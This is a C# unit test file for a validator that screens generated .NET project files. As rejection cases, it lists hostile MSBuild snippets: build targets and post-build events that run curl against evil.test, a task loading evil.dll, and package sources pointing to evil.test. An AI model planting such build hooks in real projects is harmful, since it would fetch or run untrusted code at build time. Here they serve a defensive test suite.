using Hexalith.FrontComposer.Mcp.Skills;

using Shouldly;

namespace Hexalith.FrontComposer.Mcp.Tests.Skills;

public sealed class GeneratedCodeValidatorTests {
    [Fact]
    public void Validator_AcceptsGoodGeneratedBoundedContextShape() {
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Billing/Billing.csproj", """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup>
                    <TargetFramework>net10.0</TargetFramework>
                  </PropertyGroup>
                  <ItemGroup>
                    <PackageReference Include="Hexalith.FrontComposer.Contracts" Version="1.0.0" />
                  </ItemGroup>
                </Project>
                """),
            new GeneratedCodeFile("Billing/CreateInvoiceCommand.cs", """
                using Hexalith.FrontComposer.Contracts.Attributes;
                namespace Billing;
                [Command]
                [BoundedContext("Billing")]
                public partial class CreateInvoiceCommand { public string MessageId { get; set; } = ""; public string InvoiceNumber { get; set; } = ""; }
                """),
            new GeneratedCodeFile("Billing/InvoiceProjection.cs", """
                using Hexalith.FrontComposer.Contracts.Attributes;
                namespace Billing;
                [Projection]
                [BoundedContext("Billing")]
                public partial class InvoiceProjection { public string InvoiceNumber { get; set; } = ""; }
                """),
            new GeneratedCodeFile("Billing/BillingRegistration.cs", "namespace Billing; public static class BillingRegistration { public static void AddBillingFrontComposer() {} }"),
            new GeneratedCodeFile("Billing/CreateInvoiceCommandValidator.cs", "namespace Billing; public sealed class CreateInvoiceCommandValidator {}"),
            new GeneratedCodeFile("Billing.Tests/CreateInvoiceCommandTests.cs", "namespace Billing.Tests; public sealed class CreateInvoiceCommandTests {}"),
            new GeneratedCodeFile("Billing/obj/Debug/net10.0/FrontComposer.McpManifest.g.cs", "generated manifest"),
        ]);

        result.IsValid.ShouldBeTrue();
        result.Diagnostics.ShouldBeEmpty();
    }

    [Fact]
    public void Validator_AcceptsTargetFrameworkElementInCsproj() {
        // P-3: <TargetFramework> must NOT collide with the <Target> denylist — every real
        // SDK-style csproj declares a TargetFramework, and the prior substring match rejected
        // them all.
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Billing/Billing.csproj", """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup>
                    <TargetFramework>net10.0</TargetFramework>
                    <TargetFrameworks>net10.0;net9.0</TargetFrameworks>
                  </PropertyGroup>
                  <ItemGroup>
                    <PackageReference Include="Hexalith.FrontComposer.Contracts" Version="1.0.0" />
                  </ItemGroup>
                </Project>
                """),
        ]);

        result.Diagnostics.ShouldNotContain(d => d.Category == GeneratedCodeFailureCategory.PackageBoundary);
    }

    [Theory]
    [InlineData("<Target Name=\"Bad\"><Exec Command=\"curl https://example.test\" /></Target>", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.3\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<PackageReference Version=\"13.0.3\" Include=\"Newtonsoft.Json\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<PackageReference Update=\"Newtonsoft.Json\" Version=\"13.0.0\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<Import Project=\"..\\build\\local.targets\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<UsingTask AssemblyFile=\"evil.dll\" TaskName=\"Evil\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<Choose><When Condition=\"true\"><PropertyGroup /></When></Choose>", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<Sdk Name=\"Evil.Sdk\" Version=\"1.0.0\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<PackageSource Key=\"evil\" Value=\"https://evil.test\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<RestoreSources>https://evil.test/v3/index.json</RestoreSources>", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<PostBuildEvent>curl https://evil.test</PostBuildEvent>", GeneratedCodeFailureCategory.PackageBoundary)]
    [InlineData("<ProjectReference Include=\"..\\..\\evil\\evil.csproj\" />", GeneratedCodeFailureCategory.PackageBoundary)]
    public void Validator_RejectsUnsafeProjectShapeBeforeCompile(string projectContent, GeneratedCodeFailureCategory category) {
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Bad/Bad.csproj", "<Project Sdk=\"Microsoft.NET.Sdk\">" + projectContent + "</Project>"),
        ]);

        result.IsValid.ShouldBeFalse();
        result.Diagnostics.ShouldContain(d => d.Category == category);
    }

    [Fact]
    public void Validator_RejectsTenantSpoofingAndGeneratedFileEdits() {
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Bad/Bad.csproj", "<Project Sdk=\"Microsoft.NET.Sdk\" />"),
            new GeneratedCodeFile("Bad/SubmitCommand.cs", """
                using Hexalith.FrontComposer.Contracts.Attributes;
                namespace Bad;
                [Command]
                public partial class SubmitCommand { public string MessageId { get; set; } = ""; public string TenantId { get; set; } = ""; public string UserId { get; set; } = ""; }
                """),
            new GeneratedCodeFile("Bad/SubmitCommand.g.cs", "hand edited generated file"),
        ]);

        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.TenantSpoofing);
        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.GeneratedFileEdit);
    }

    [Fact]
    public void Validator_DoesNotFlagLegitimateUserIdSubstringFields() {
        // P-8: the spoof detector should not flag fields whose names happen to contain the
        // substring "UserId" (e.g., RecipientUserId, LastTenantIdentifier). The check anchors
        // on a strict access-modifier + type + exact-member-name pattern.
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Sales/Sales.csproj", """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
                  <ItemGroup><PackageReference Include="Hexalith.FrontComposer.Contracts" Version="1.0.0" /></ItemGroup>
                </Project>
                """),
            new GeneratedCodeFile("Sales/CreateOrderCommand.cs", """
                using Hexalith.FrontComposer.Contracts.Attributes;
                namespace Sales;
                [Command]
                public partial class CreateOrderCommand
                {
                    public string MessageId { get; set; } = "";
                    public string RecipientUserId { get; set; } = "";
                    public string LastTenantIdentifier { get; set; } = "";
                }
                """),
            new GeneratedCodeFile("Sales/Projection.cs", "using Hexalith.FrontComposer.Contracts.Attributes; [Projection] public partial class P {}"),
            new GeneratedCodeFile("Sales/Reg.cs", "namespace Sales; public static class Reg { public static void AddSalesFrontComposer() {} }"),
            new GeneratedCodeFile("Sales/Validator.cs", "namespace Sales; public sealed class V {}"),
            new GeneratedCodeFile("Sales.Tests/Tests.cs", "namespace Sales.Tests; public sealed class T {}"),
            new GeneratedCodeFile("Sales/obj/Debug/net10.0/FrontComposer.McpManifest.g.cs", "generated manifest"),
        ]);

        result.Diagnostics.ShouldNotContain(d => d.Category == GeneratedCodeFailureCategory.TenantSpoofing);
    }

    [Fact]
    public void Validator_AcceptsTestPackagesXunitRunnerVisualStudioAndCoverletCollector() {
        // P-18: the approved packages list must include xunit.runner.visualstudio and
        // coverlet.collector so legitimate test scaffolds are not flagged.
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Billing.Tests/Billing.Tests.csproj", """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
                  <ItemGroup>
                    <PackageReference Include="Microsoft.NET.Test.Sdk" Version="17.0.0" />
                    <PackageReference Include="xunit.v3" Version="1.0.0" />
                    <PackageReference Include="xunit.runner.visualstudio" Version="2.5.0" />
                    <PackageReference Include="coverlet.collector" Version="6.0.0" />
                  </ItemGroup>
                </Project>
                """),
        ]);

        result.Diagnostics.ShouldNotContain(d => d.Category == GeneratedCodeFailureCategory.PackageBoundary);
    }

    [Fact]
    public void Validator_AccumulatesAllCategoriesInsteadOfShortCircuiting() {
        // P-40 / DN-4: a generation that simultaneously violates package-boundary AND tenant
        // spoofing AND missing-registration produces every relevant diagnostic in a single run
        // so consumers see the full picture in one pass.
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Bad/Bad.csproj", "<Project Sdk=\"Microsoft.NET.Sdk\"><ItemGroup><PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.0\" /></ItemGroup></Project>"),
            new GeneratedCodeFile("Bad/SubmitCommand.cs", """
                using Hexalith.FrontComposer.Contracts.Attributes;
                namespace Bad;
                [Command]
                public partial class SubmitCommand { public string MessageId { get; set; } = ""; public string TenantId { get; set; } = ""; }
                """),
        ]);

        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.PackageBoundary);
        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.TenantSpoofing);
        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.MissingRegistration);
    }

    [Fact]
    public void Validator_FlagsMissingRegistrationWithoutAddXFrontComposerCall() {
        // P-10 / P-32: registration heuristic requires a method matching `Add[A-Z]\w*FrontComposer\w*\(`.
        // A file containing only `using` directives or comments mentioning FrontComposer should
        // still be flagged.
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Sales/Sales.csproj", """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
                  <ItemGroup><PackageReference Include="Hexalith.FrontComposer.Contracts" Version="1.0.0" /></ItemGroup>
                </Project>
                """),
            new GeneratedCodeFile("Sales/CreateOrder.cs", "using Hexalith.FrontComposer.Contracts.Attributes; [Command] public partial class CreateOrder {}"),
            new GeneratedCodeFile("Sales/Projection.cs", "using Hexalith.FrontComposer.Contracts.Attributes; [Projection] public partial class P {}"),
            new GeneratedCodeFile("Sales/Validator.cs", "// TODO: Add FrontComposer registration here."),
            new GeneratedCodeFile("Sales.Tests/Tests.cs", "namespace Sales.Tests; public sealed class T {}"),
            new GeneratedCodeFile("Sales/obj/Debug/net10.0/FrontComposer.McpManifest.g.cs", "generated manifest"),
        ]);

        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.MissingRegistration);
    }

    [Fact]
    public void Validator_DoesNotFlagFalseManifestForObjectiveSubstringPaths() {
        // P-11: the manifest detection requires a `/obj/` segment, not the `obj` substring,
        // so a path like `Sales.Objective/file.g.cs` does not produce a false manifest detection.
        GeneratedCodeValidationResult result = GeneratedBoundedContextValidator.Validate([
            new GeneratedCodeFile("Sales/Sales.csproj", """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
                  <ItemGroup><PackageReference Include="Hexalith.FrontComposer.Contracts" Version="1.0.0" /></ItemGroup>
                </Project>
                """),
            new GeneratedCodeFile("Sales/CreateOrder.cs", "using Hexalith.FrontComposer.Contracts.Attributes; [Command] public partial class CreateOrder {}"),
            new GeneratedCodeFile("Sales/Projection.cs", "using Hexalith.FrontComposer.Contracts.Attributes; [Projection] public partial class P {}"),
            new GeneratedCodeFile("Sales/Reg.cs", "namespace Sales; public static class Reg { public static void AddSalesFrontComposer() {} }"),
            new GeneratedCodeFile("Sales/Validator.cs", "namespace Sales; public sealed class V {}"),
            new GeneratedCodeFile("Sales.Tests/Tests.cs", "namespace Sales.Tests; public sealed class T {}"),
            new GeneratedCodeFile("Sales.Objective/manifest.g.cs", "this is not a real manifest output"),
        ]);

        result.Diagnostics.ShouldContain(d => d.Category == GeneratedCodeFailureCategory.SourceToolsManifest);
    }
}
